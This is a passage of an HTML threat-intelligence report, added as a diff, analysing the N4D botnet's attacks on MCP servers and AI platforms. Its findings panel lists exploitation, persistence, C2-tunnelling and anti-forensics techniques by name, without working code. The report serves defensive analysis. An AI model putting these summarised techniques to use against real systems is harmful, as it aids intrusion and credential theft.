@@ -1,0 +1,3719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>N4D Mesh Controller - Threat Intelligence Report</title>
+<meta name="description" content="Threat intelligence report on the N4D Mesh Controller botnet campaign targeting MCP servers for unauthenticated RCE and cloud credential harvesting.">
+<style>
+:root {
+  --bg:     #0a0c10;
+  --bg2:    #0f1117;
+  --bg3:    #161b22;
+  --border: #21262d;
+  --red:    #ff4444;
+  --red-d:  #b91c1c;
+  --orange: #f97316;
+  --yellow: #eab308;
+  --green:  #22c55e;
+  --blue:   #3b82f6;
+  --purple: #a855f7;
+  --text:   #e6edf3;
+  --dim:    #8b949e;
+  --mute:   #484f58;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+  font-size: 15px;
+  line-height: 1.75;
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ====== NAV ====== */
+nav {
+  position: sticky;
+  top: 0;
+  z-index: 300;
+  background: rgba(10,12,16,0.95);
+  border-bottom: 1px solid var(--border);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  height: 50px;
+  display: flex;
+  align-items: center;
+  padding: 0 24px;
+  gap: 0;
+  overflow-x: auto;
+  overflow-y: hidden;
+}
+
+.nav-brand {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--red);
+  letter-spacing: 0.12em;
+  text-decoration: none;
+  white-space: nowrap;
+  flex-shrink: 0;
+  margin-right: 20px;
+}
+
+.nav-links {
+  display: flex;
+  align-items: center;
+  gap: 2px;
+  flex: 1;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+.nav-links::-webkit-scrollbar { display: none; }
+
+.nav-links a {
+  display: inline-block;
+  padding: 4px 10px;
+  font-size: 11px;
+  color: var(--dim);
+  text-decoration: none;
+  border-radius: 4px;
+  white-space: nowrap;
+  transition: color 0.15s, background 0.15s;
+  font-family: 'Courier New', Courier, monospace;
+  letter-spacing: 0.03em;
+}
+.nav-links a:hover,
+.nav-links a.active {
+  color: var(--text);
+  background: var(--bg3);
+}
+.nav-links a.active { color: var(--red); }
+
+.nav-right {
+  flex-shrink: 0;
+  margin-left: 16px;
+  display: flex;
+  align-items: center;
+}
+
+.tlp-badge {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  padding: 3px 10px;
+  border-radius: 3px;
+  background: rgba(255,255,255,0.08);
+  color: #e6edf3;
+  border: 1px solid rgba(255,255,255,0.25);
+  white-space: nowrap;
+}
+
+/* ====== HEADER ====== */
+header {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 64px 40px 56px;
+  position: relative;
+  overflow: hidden;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40'%3E%3Crect width='40' height='40' fill='%230f1117'/%3E%3Crect x='4' y='4' width='32' height='32' fill='none' stroke='%2321262d' stroke-width='1.2' opacity='0.3'/%3E%3C/svg%3E");
+}
+
+header::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: radial-gradient(ellipse 60% 80% at 80% 50%, rgba(185,28,28,0.15) 0%, transparent 65%),
+              radial-gradient(ellipse 40% 60% at 10% 80%, rgba(59,130,246,0.1) 0%, transparent 55%);
+  pointer-events: none;
+}
+
+.header-inner {
+  max-width: 1120px;
+  margin: 0 auto;
+  position: relative;
+}
+
+header h1 {
+  font-size: clamp(28px, 4vw, 48px);
+  font-weight: 800;
+  line-height: 1.1;
+  letter-spacing: -0.025em;
+  margin-bottom: 16px;
+  color: var(--text);
+}
+
+header h1 .accent { color: var(--red); }
+
+.subtitle {
+  font-size: 16px;
+  color: var(--dim);
+  line-height: 1.6;
+  max-width: 680px;
+  margin-bottom: 32px;
+}
+
+.meta-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 24px;
+  padding-top: 24px;
+  border-top: 1px solid var(--border);
+}
+
+.meta-row span {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 11px;
+  color: var(--mute);
+  letter-spacing: 0.05em;
+}
+
+.meta-row span strong {
+  color: var(--dim);
+  font-weight: 600;
+}
+
+/* ====== LAYOUT ====== */
+.page-wrap {
+  max-width: 1120px;
+  margin: 0 auto;
+  padding: 0 24px;
+}
+
+.content-grid {
+  display: grid;
+  grid-template-columns: 1fr 290px;
+  gap: 48px;
+  padding: 48px 0 80px;
+  align-items: start;
+}
+
+@media (max-width: 960px) {
+  .content-grid { grid-template-columns: 1fr; }
+  aside { display: none; }
+}
+
+/* ====== ARTICLE ====== */
+article { min-width: 0; }
+
+article h2 {
+  font-size: 19px;
+  font-weight: 700;
+  margin: 60px 0 20px;
+  padding-left: 1rem;
+  border-left: 3px solid var(--red);
+  color: var(--text);
+  letter-spacing: -0.01em;
+  line-height: 1.3;
+}
+
+article h2:first-child { margin-top: 0; }
+
+article h3 {
+  font-size: 14px;
+  font-weight: 600;
+  margin: 36px 0 14px;
+  padding-left: 0.9rem;
+  border-left: 3px solid var(--orange);
+  color: var(--text);
+  letter-spacing: 0.01em;
+  text-transform: uppercase;
+}
+
+article p {
+  color: var(--dim);
+  margin-bottom: 16px;
+  line-height: 1.75;
+}
+
+article strong { color: var(--text); font-weight: 600; }
+
+article ul, article ol {
+  color: var(--dim);
+  padding-left: 22px;
+  margin-bottom: 16px;
+}
+
+article li { margin-bottom: 6px; line-height: 1.65; }
+
+article a { color: var(--blue); text-decoration: none; }
+article a:hover { text-decoration: underline; }
+
+/* ====== CODE ====== */
+pre {
+  background: #0d1117;
+  border: 1px solid var(--border);
+  border-radius: 7px;
+  padding: 18px 20px;
+  overflow-x: auto;
+  margin: 20px 0;
+  font-size: 12.5px;
+  line-height: 1.65;
+  font-family: 'Courier New', Courier, monospace;
+}
+
+code {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 12px;
+  background: rgba(110,118,129,0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 2px 6px;
+  color: #a5d6ff;
+  word-break: break-all;
+}
+
+pre code {
+  background: none;
+  border: none;
+  padding: 0;
+  font-size: inherit;
+  color: var(--dim);
+  word-break: normal;
+}
+
+span.kw  { color: #ff7b72; }
+span.cm  { color: var(--mute); font-style: italic; }
+span.st  { color: #a8ff9c; }
+span.fn  { color: #ffa657; }
+span.hl  { background: rgba(185,28,28,0.3); border-radius: 2px; padding: 1px 2px; }
+span.dim-c { color: var(--mute); }
+span.grn { color: var(--green); }
+span.blu { color: var(--blue); }
+span.yel { color: var(--yellow); }
+span.ppl { color: var(--purple); }
+
+/* ====== CALLOUTS ====== */
+.callout-red {
+  border-left: 3px solid var(--red);
+  background: #1a0a0a;
+  padding: 14px 18px;
+  margin: 20px 0;
+  border-radius: 0 6px 6px 0;
+}
+.callout-red p { color: #fca5a5; margin-bottom: 0; }
+.callout-red code { background: rgba(255,68,68,0.1); border-color: rgba(255,68,68,0.25); color: #fca5a5; }
+
+.callout-blue {
+  border-left: 3px solid var(--blue);
+  background: #0a0f1a;
+  padding: 14px 18px;
+  margin: 20px 0;
+  border-radius: 0 6px 6px 0;
+}
+.callout-blue p { color: #93c5fd; margin-bottom: 0; }
+.callout-blue code { background: rgba(59,130,246,0.1); border-color: rgba(59,130,246,0.25); color: #93c5fd; }
+
+.callout-orange {
+  border-left: 3px solid var(--orange);
+  background: #1a100a;
+  padding: 14px 18px;
+  margin: 20px 0;
+  border-radius: 0 6px 6px 0;
+}
+.callout-orange p { color: #fdba74; margin-bottom: 0; }
+.callout-orange code { background: rgba(249,115,22,0.1); border-color: rgba(249,115,22,0.25); color: #fdba74; }
+
+/* ====== TABLES ====== */
+.tbl-wrap {
+  overflow-x: auto;
+  margin: 20px 0;
+  border-radius: 8px;
+  border: 1px solid var(--border);
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+}
+
+th {
+  background: var(--bg3);
+  color: var(--mute);
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  text-align: left;
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--border);
+  font-family: 'Courier New', Courier, monospace;
+  font-weight: 600;
+}
+
+td {
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--border);
+  color: var(--dim);
+  vertical-align: top;
+  line-height: 1.5;
+}
+
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: rgba(255,255,255,0.015); }
+
+td.mono { font-family: 'Courier New', Courier, monospace; font-size: 11px; }
+td.strong { color: var(--text); font-weight: 500; }
+td.red-text { color: var(--red); font-family: 'Courier New', Courier, monospace; font-size: 11px; }
+
+/* ====== PILLS ====== */
+.pill {
+  display: inline-block;
+  font-size: 10px;
+  padding: 2px 8px;
+  border-radius: 10px;
+  font-weight: 700;
+  letter-spacing: 0.04em;
+  white-space: nowrap;
+  font-family: 'Courier New', Courier, monospace;
+}
+.p-red    { background: rgba(255,68,68,0.15); color: #fca5a5; border: 1px solid rgba(255,68,68,0.25); }
+.p-orange { background: rgba(249,115,22,0.15); color: #fdba74; border: 1px solid rgba(249,115,22,0.25); }
+.p-blue   { background: rgba(59,130,246,0.12); color: #93c5fd; border: 1px solid rgba(59,130,246,0.2); }
+.p-green  { background: rgba(34,197,94,0.1); color: #86efac; border: 1px solid rgba(34,197,94,0.2); }
+.p-yellow { background: rgba(234,179,8,0.1); color: #fde68a; border: 1px solid rgba(234,179,8,0.2); }
+.p-dim    { background: var(--bg3); color: var(--dim); border: 1px solid var(--border); }
+
+/* ====== FIGURES ====== */
+.fig-wrap {
+  margin: 28px 0;
+}
+.fig-wrap img {
+  width: 100%;
+  max-width: 1200px;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin: 0;
+  display: block;
+}
+.fig-cap {
+  font-size: 11px;
+  color: var(--mute);
+  margin-top: 8px;
+  font-style: italic;
+  line-height: 1.5;
+}
+
+/* ====== SIDEBAR ====== */
+aside {
+  position: sticky;
+  top: 66px;
+}
+
+.sidebar-block {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px 18px;
+  margin-bottom: 14px;
+}
+
+.sidebar-block h4 {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 9px;
+  color: var(--mute);
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  margin-bottom: 14px;
+  font-weight: 700;
+}
+
+.toc {
+  list-style: none;
+  padding: 0;
+}
+
+.toc li { margin: 0; }
+
+.toc a {
+  display: block;
+  padding: 5px 8px;
+  font-size: 11px;
+  color: var(--dim);
+  text-decoration: none;
+  border-left: 2px solid transparent;
+  border-radius: 0 4px 4px 0;
+  transition: all 0.15s;
+  font-family: 'Courier New', Courier, monospace;
+  margin-bottom: 1px;
+  line-height: 1.4;
+}
+
+.toc a:hover {
+  color: var(--text);
+  background: var(--bg3);
+  border-left-color: var(--red);
+}
+
+.toc a.toc-active {
+  color: var(--red);
+  background: rgba(185,28,28,0.08);
+  border-left-color: var(--red);
+}
+
+.stat-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 12px;
+}
+
+.stat-table td {
+  padding: 5px 0;
+  border-bottom: 1px solid var(--border);
+  color: var(--dim);
+  vertical-align: middle;
+}
+
+.stat-table tr:last-child td { border-bottom: none; }
+.stat-table td.val {
+  text-align: right;
+  font-family: 'Courier New', Courier, monospace;
+  color: var(--text);
+  font-weight: 600;
+  font-size: 11px;
+}
+.stat-table td.val.red { color: var(--red); }
+.stat-table td.val.green { color: var(--green); }
+.stat-table td.val.yellow { color: var(--yellow); }
+
+.ioc-list { list-style: none; padding: 0; }
+.ioc {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 5px 0;
+  border-bottom: 1px solid var(--border);
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 11px;
+  color: var(--dim);
+}
+.ioc:last-child { border-bottom: none; }
+.ioc-type {
+  font-size: 8px;
+  padding: 2px 5px;
+  border-radius: 3px;
+  white-space: nowrap;
+  font-weight: 700;
+  letter-spacing: 0.06em;
+  background: rgba(255,68,68,0.12);
+  color: var(--red);
+  border: 1px solid rgba(255,68,68,0.22);
+  flex-shrink: 0;
+}
+.ioc code {
+  font-size: 10px;
+  background: none;
+  border: none;
+  padding: 0;
+  color: var(--dim);
+  word-break: break-all;
+}
+
+.severity-score {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 26px;
+  font-weight: 700;
+  color: var(--red);
+  letter-spacing: -0.02em;
+  margin: 8px 0;
+}
+
+.severity-note {
+  font-size: 11px;
+  color: var(--mute);
+  line-height: 1.5;
+}
+
+/* ====== TOOL GRID ====== */
+.tool-grid {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin: 14px 0;
+}
+.tool {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 11px;
+  padding: 4px 10px;
+  border-radius: 5px;
+  border: 1px solid;
+}
+.t-danger { background: rgba(255,68,68,0.09); border-color: rgba(255,68,68,0.28); color: #fca5a5; }
+.t-warn   { background: rgba(249,115,22,0.08); border-color: rgba(249,115,22,0.28); color: #fdba74; }
+.t-safe   { background: rgba(34,197,94,0.06); border-color: rgba(34,197,94,0.2); color: #86efac; }
+
+/* ====== STAGE LIST ====== */
+.stage-list { margin: 20px 0; }
+.stage-item {
+  display: flex;
+  gap: 14px;
+  margin-bottom: 14px;
+  align-items: flex-start;
+}
+.stage-num {
+  flex-shrink: 0;
+  width: 28px; height: 28px;
+  background: rgba(185,28,28,0.18);
+  border: 1px solid rgba(255,68,68,0.3);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 10px;
+  color: var(--red);
+  font-weight: 700;
+  margin-top: 2px;
+}
+.stage-name { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+.stage-desc { font-size: 13px; color: var(--mute); line-height: 1.55; }
+
+/* ====== FOOTER ====== */
+footer {
+  background: var(--bg2);
+  border-top: 1px solid var(--border);
+  padding: 44px 40px;
+}
+
+.footer-inner {
+  max-width: 1120px;
+  margin: 0 auto;
+  display: grid;
+  grid-template-columns: 1fr auto;
+  gap: 40px;
+  align-items: start;
+}
+
+.footer-body {
+  font-size: 12px;
+  color: var(--mute);
+  line-height: 1.75;
+}
+
+.footer-meta {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 11px;
+  color: var(--mute);
+  text-align: right;
+  white-space: nowrap;
+}
+
+.footer-meta div { margin-bottom: 5px; }
+
+@media (max-width: 640px) {
+  footer { padding: 32px 20px; }
+  .footer-inner { grid-template-columns: 1fr; }
+  .footer-meta { text-align: left; }
+  header { padding: 40px 20px 36px; }
+  .page-wrap { padding: 0 16px; }
+}
+
+/* ====== RADAR BANNER ====== */
+.radar-wrap {
+  position: absolute;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  width: 530px;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  pointer-events: none;
+  overflow: hidden;
+}
+@media (max-width: 860px) { .radar-wrap { display: none; } }
+
+/* ====== KEY FINDINGS PANEL ====== */
+.findings-panel {
+  margin: 0 0 48px;
+  border: 1px solid rgba(255,68,68,0.25);
+  border-radius: 10px;
+  overflow: hidden;
+  background: rgba(185,28,28,0.04);
+}
+.findings-label {
+  background: rgba(185,28,28,0.12);
+  border-bottom: 1px solid rgba(255,68,68,0.2);
+  padding: 10px 18px;
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 0.14em;
+  color: var(--red);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.findings-label::before {
+  content: '';
+  display: inline-block;
+  width: 7px; height: 7px;
+  background: var(--red);
+  border-radius: 50%;
+  animation: blink-dot 1.4s ease-in-out infinite;
+}
+@keyframes blink-dot {
+  0%,100% { opacity: 1; }
+  50%      { opacity: 0.2; }
+}
+.findings-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 0;
+}
+@media (max-width: 760px) { .findings-grid { grid-template-columns: 1fr; } }
+@media (max-width: 1060px) and (min-width: 761px) { .findings-grid { grid-template-columns: repeat(2, 1fr); } }
+.finding-card {
+  padding: 16px 18px;
+  border-right: 1px solid rgba(255,68,68,0.12);
+  border-bottom: 1px solid rgba(255,68,68,0.12);
+}
+.finding-card:nth-child(3n) { border-right: none; }
+.finding-card:nth-last-child(-n+3) { border-bottom: none; }
+.fc-tag {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  padding: 2px 7px;
+  border-radius: 3px;
+  display: inline-block;
+  margin-bottom: 8px;
+}
+.fc-tag-red    { background: rgba(255,68,68,0.15);  color: #fca5a5; border: 1px solid rgba(255,68,68,0.3); }
+.fc-tag-orange { background: rgba(249,115,22,0.12); color: #fdba74; border: 1px solid rgba(249,115,22,0.3); }
+.fc-tag-purple { background: rgba(168,85,247,0.12); color: #d8b4fe; border: 1px solid rgba(168,85,247,0.3); }
+.fc-tag-blue   { background: rgba(59,130,246,0.12); color: #93c5fd; border: 1px solid rgba(59,130,246,0.3); }
+.fc-tag-yellow { background: rgba(234,179,8,0.1);   color: #fde68a; border: 1px solid rgba(234,179,8,0.3); }
+.fc-tag-green  { background: rgba(34,197,94,0.08);  color: #86efac; border: 1px solid rgba(34,197,94,0.25); }
+.fc-title {
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 5px;
+  line-height: 1.3;
+}
+.fc-body {
+  font-size: 12px;
+  color: var(--dim);
+  line-height: 1.6;
+}
+.fc-body code {
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 11px;
+  background: rgba(255,255,255,0.05);
+  padding: 1px 4px;
+  border-radius: 3px;
+  color: var(--text);
+}
+
+/* ====== AI TARGET HIGHLIGHT ====== */
+.ai-callout {
+  background: linear-gradient(135deg, rgba(168,85,247,0.07) 0%, rgba(59,130,246,0.05) 100%);
+  border: 1px solid rgba(168,85,247,0.3);
+  border-radius: 8px;
+  padding: 16px 20px;
+  margin: 20px 0;
+}
+.ai-callout p { color: var(--dim); margin: 0; }
+.ai-callout strong { color: #d8b4fe; }
+
+/* ====== STAT CHIPS ====== */
+.stat-chips {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin: 16px 0 24px;
+}
+.stat-chip {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 6px 12px;
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 11px;
+}
+.stat-chip .sc-num {
+  font-size: 16px;
+  font-weight: 700;
+  line-height: 1;
+}
+.stat-chip .sc-label { color: var(--mute); font-size: 10px; }
+.sc-red    { color: var(--red); }
+.sc-orange { color: var(--orange); }
+.sc-purple { color: var(--purple); }
+.sc-blue   { color: var(--blue); }
+.sc-green  { color: var(--green); }
+.sc-yellow { color: var(--yellow); }
+
+/* Active TOC styling */
+.toc li a { transition: color 0.2s ease; }
+.toc li a.active { color: var(--orange); font-weight: bold; }
+.toc li a.active::before { content: "→ "; margin-right: 4px; }
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const tocLinks = document.querySelectorAll('.toc a');
+  const sections = [];
+
+  tocLinks.forEach(link => {
+    const id = link.getAttribute('href').substring(1);
+    const section = document.getElementById(id);
+    if (section) sections.push({ id, element: section, link });
+  });
+
+  function updateActiveLink() {
+    let active = null;
+    for (let section of sections) {
+      const rect = section.element.getBoundingClientRect();
+      if (rect.top < window.innerHeight / 3) active = section;
+    }
+
+    tocLinks.forEach(link => link.classList.remove('active'));
+    if (active) active.link.classList.add('active');
+  }
+
+  window.addEventListener('scroll', updateActiveLink);
+  window.addEventListener('load', updateActiveLink);
+  updateActiveLink();
+});
+</script>
+</head>
+<body>
+
+
+<!-- ====== HEADER ====== -->
+<header>
+  <!-- Radar background -->
+  <div class="radar-wrap">
+    <canvas id="n4d-mesh" width="510" height="260" style="opacity:0.44;flex-shrink:0;display:block;"></canvas>
+  </div>
+  <script>
+  (function(){
+    var cvs=document.getElementById('n4d-mesh');
+    if(!cvs||!cvs.getContext)return;
+    var ctx=cvs.getContext('2d'),W=cvs.width,H=cvs.height,frame=0;
+    /* Nodes spread in a wide elliptical orbit — C2 at centre */
+    var N=[
+      {x:255,y:130,r:11,c:'#ff4444',lb:'C2',       fx:true},
+      {x:52,  y:72, r:8, c:'#f97316',lb:'MCP'},
+      {x:175, y:22, r:8, c:'#f97316',lb:'Redis'},
+      {x:370, y:18, r:7, c:'#a855f7',lb:'LightLLM'},
+      {x:468, y:78, r:7, c:'#a855f7',lb:'Marimo'},
+      {x:52,  y:190,r:8, c:'#f97316',lb:'Docker'},
+      {x:468, y:182,r:7, c:'#a855f7',lb:'Ray'},
+      {x:255, y:240,r:8, c:'#f97316',lb:'K8s'}
+    ];
+    N.forEach(function(n){n.ox=n.x;n.oy=n.y;});
+    var E=[
+      [0,1],[0,2],[0,3],[0,4],[0,5],[0,6],[0,7],
+      [1,2],[2,3],[4,6],[5,7],[1,5],[3,4]
+    ];
+    /* One packet per edge, staggered start positions */
+    var P=E.map(function(e,i){return{ei:i,t:(i*0.14)%1,sp:0.0038+i*0.0002};});
+    function draw(){
+      ctx.clearRect(0,0,W,H);
+      var t=frame*0.01;
+      N.forEach(function(n,i){
+        if(!n.fx){n.x=n.ox+Math.sin(t+i*1.25)*5;n.y=n.oy+Math.cos(t*0.82+i*0.78)*4;}
+      });
+      /* Edges */
+      E.forEach(function(e,i){
+        var a=N[e[0]],b=N[e[1]],al=0.12+0.08*Math.sin(frame*0.04+i*0.95);
+        ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
+        ctx.strokeStyle=a.c;ctx.globalAlpha=al*0.28;ctx.lineWidth=4;ctx.stroke();
+        ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
+        ctx.strokeStyle=a.c;ctx.globalAlpha=al;ctx.lineWidth=0.65;ctx.stroke();
+        ctx.globalAlpha=1;
+      });
+      /* Packets */
+      P.forEach(function(p){
+        var e=E[p.ei],a=N[e[0]],b=N[e[1]];
+        ctx.beginPath();
+        ctx.arc(a.x+(b.x-a.x)*p.t,a.y+(b.y-a.y)*p.t,2.5,0,Math.PI*2);
+        ctx.fillStyle=a.c;ctx.globalAlpha=0.88;ctx.fill();ctx.globalAlpha=1;
+        p.t=(p.t+p.sp)%1;
+      });
+      /* Nodes */
+      N.forEach(function(n){
+        var g=ctx.createRadialGradient(n.x,n.y,0,n.x,n.y,n.r*4);
+        g.addColorStop(0,n.c+'44');g.addColorStop(1,n.c+'00');
+        ctx.beginPath();ctx.arc(n.x,n.y,n.r*4,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();
+        ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);
+        ctx.fillStyle=n.c+'18';ctx.fill();
+        ctx.strokeStyle=n.c;ctx.lineWidth=1.3;ctx.stroke();
+        if(n.fx){
+          [18,30].forEach(function(off,k){
+            ctx.beginPath();ctx.arc(n.x,n.y,n.r+off+4*Math.sin(frame*0.07+k*1.57),0,Math.PI*2);
+            ctx.strokeStyle=n.c;ctx.globalAlpha=0.18-k*0.06;ctx.lineWidth=0.8;ctx.stroke();ctx.globalAlpha=1;
+          });
+        }
+        ctx.fillStyle=n.c;ctx.globalAlpha=0.8;
+        ctx.font=(n.fx?'bold 9px':'8px')+' monospace';ctx.textAlign='center';
+        ctx.fillText(n.lb,n.x,n.y+n.r+11);ctx.globalAlpha=1;
+      });
+      frame++;requestAnimationFrame(draw);
+    }
+    draw();
+  })();
+  </script>
+
+  <div class="header-inner">
+    <h1><span class="accent">N4D MESH CONTROLLER</span></h1>
+    <p class="subtitle">Precedent-setting botnet combining generic MCP exploitation, automated multi-step lateral movement planning, and AI/LLM infrastructure targeting with emerging defense-awareness capabilities</p>
+  </div>
+</header>
+
+<!-- ====== CONTENT ====== -->
+<div class="page-wrap">
+<div class="content-grid">
+
+<!-- ============================================================ -->
+<!-- ARTICLE                                                       -->
+<!-- ============================================================ -->
+<article>
+
+<!-- KEY FINDINGS PANEL -->
+<div class="findings-panel">
+  <div class="findings-label" id="key-findings">KEY FINDINGS — BINARY ANALYSIS + LIVE CAMPAIGN (2026-07-02)</div>
+  <div class="findings-grid">
+
+    <div class="finding-card">
+      <span class="fc-tag fc-tag-purple">INTEGRATED BOTNET</span>
+      <div class="fc-title">4 Integrated Capabilities</div>
+      <div class="fc-body">
+        <div><strong>1. Generic MCP Exploitation:</strong> C2-controlled botnet that auto-discovers and exploits MCP servers.</div>
+        <div><strong>2. AI Infrastructure Targeting:</strong> Dedicated chains for LightLLM, Ray (/run API), FastGPT.</div>
+        <div><strong>3. Automated Exploit Chaining:</strong> pathing_engine.py plans multi-step lateral movement (scan→find→execute→harvest→deploy).</div>
+        <div><strong>4. Defense-Aware:</strong> Encodes prompt injection as security category, suggesting active engagement with defended AI systems.</div>
+      </div>
+    </div>
+
+    <div class="finding-card">
+      <span class="fc-tag fc-tag-red">GO BINARY</span>
+      <div class="fc-title">170+ Named Functions in Debug Build</div>
+      <div class="fc-body">Complete forensic reconstruction from <code>n4d_debug</code> (7.3 MB, ELF64, Jun 26 2026). Symbol tables intact, enabling identification of 170+ named Go functions. Includes 20+ reconnaissance/probe functions (scanCIDR, checkService) across the full attack lifecycle.</div>
+    </div>
+
+    <div class="finding-card">
+      <span class="fc-tag fc-tag-red">EXPLOIT SCOPE</span>
+      <div class="fc-title">30+ Service-Specific Attack Modules</div>
+      <div class="fc-body"><strong>Databases:</strong> PostgreSQL (COPY TO PROGRAM), MySQL (outfile+cron), Oracle. <strong>Caching:</strong> Redis (CONFIG SET), RabbitMQ. <strong>Container:</strong> Docker socket escape, Kubernetes etcd, kubelet API. <strong>App Servers:</strong> Tomcat, JBoss, WebLogic, Spring Gateway, Jenkins, OFBiz. <strong>Monitoring:</strong> Superset, Grafana. <strong>Cloud:</strong> AWS EC2 metadata, Azure identity.</div>
+    </div>
+
+    <div class="finding-card">
+      <span class="fc-tag fc-tag-orange">PERSISTENCE</span>
+      <div class="fc-title">6 Independent Persistence Mechanisms</div>
+      <div class="fc-body">Every compromised host receives all six simultaneously: <code>installPersistence</code> (cron.d), <code>installBashrc</code>, <code>installSystemd</code>, <code>installSSHKey</code> (~/.ssh/authorized_keys), <code>installWatchdog</code>, plus <code>/etc/profile.d/sys_alias.sh</code> for login-triggered execution.</div>
+    </div>
+
+    <div class="finding-card">
+      <span class="fc-tag fc-tag-blue">C2 CAPABILITY</span>
+      <div class="fc-title">Interactive WebSocket PTY + CF Tunnel</div>
+      <div class="fc-body">Operators access live shells via <code>/api/pty</code> WebSocket in the C2 panel. Agents establish outbound Cloudflare Quick Tunnels (<code>*.trycloudflare.com</code>) — anonymous, no domain registration, TLS signed by Cloudflare CA.</div>
+    </div>
+
+    <div class="finding-card">
+      <span class="fc-tag fc-tag-yellow">STEALTH</span>
+      <div class="fc-title">Active Anti-Forensics + HP Detection</div>
+      <div class="fc-body"><code>cleanupTraces</code>, <code>setProcName</code> (kernel worker masquerade), <code>stealthRST</code> (no connection logs), randomized delays and User-Agents. Score-based honeypot blacklist shared across the fleet.</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Section 1: Overview -->
+<h2 id="overview">01. Executive Overview</h2>
+
+<p style="font-size:0.82rem;color:var(--muted);border-left:2px solid var(--red);padding-left:0.8rem;margin-bottom:1.4rem;">
+  Initial server and malware samples provided by
+  <a href="https://x.com/malwrhunterteam/" target="_blank" style="color:var(--red);text-decoration:none;font-weight:600;">MalwareHunterTeam</a>.
+  Investigation, AI-assisted analysis, validation, and technical documentation by
+  <a href="https://x.com/1ZRR4H/" target="_blank" style="color:var(--red);text-decoration:none;font-weight:600;">1ZRR4H</a>. This analysis documents an <strong>active N4D botnet campaign</strong>.
+</p>
+
+<p>
+  The open directory exposed the complete operational toolkit of a live botnet campaign:
+  four generations of MCP scanners, a polymorphic Python agent builder, both C2 controller
+  versions, an attack chain planner, AWS post-exploitation scripts, and a Go binary
+  (<code>n4d_debug</code>) left with debug symbols intact. That binary exposed 170+
+  named functions and the full exploit arsenal. The C2 API running on port 8443 was
+  reachable during the investigation, and its credential endpoint in v3.1 required
+  no authentication.
+</p>
+
+<div style="background:var(--bg2);border-left:4px solid var(--orange);border-radius:8px;padding:24px;margin:24px 0;">
+  <p style="color:var(--text);font-size:1em;line-height:1.8;margin:0 0 16px 0;">
+    <strong style="color:var(--orange);font-size:1.1em;">⚠️ What Makes N4D Different</strong><br>
+    N4D's threat level doesn't come from any single new exploit. Instead, it combines four capabilities into one integrated botnet:
+  </p>
+
+  <div style="margin-left:20px; color:var(--dim);">
+    <p style="margin:12px 0;"><strong style="color:var(--blue);">1️⃣ Generic MCP Client Framework</strong><br>
+    Operator-directed botnet that auto-discovers and exploits MCP servers without knowing server type in advance.
+    Enumerates tool catalogs and invokes dangerous capabilities via C2 task assignment. This is different from
+    traditional botnet models, which target known services by name.</p>
+
+    <p style="margin:12px 0;"><strong style="color:var(--blue);">2️⃣ AI Infrastructure Targeting with CVE-Specific Chains</strong><br>
+    The botnet targets AI/LLM platforms (LightLLM, Ray, FastGPT) as first-class attack targets via documented CVE exploits—not incidental infrastructure like databases.</p>
+
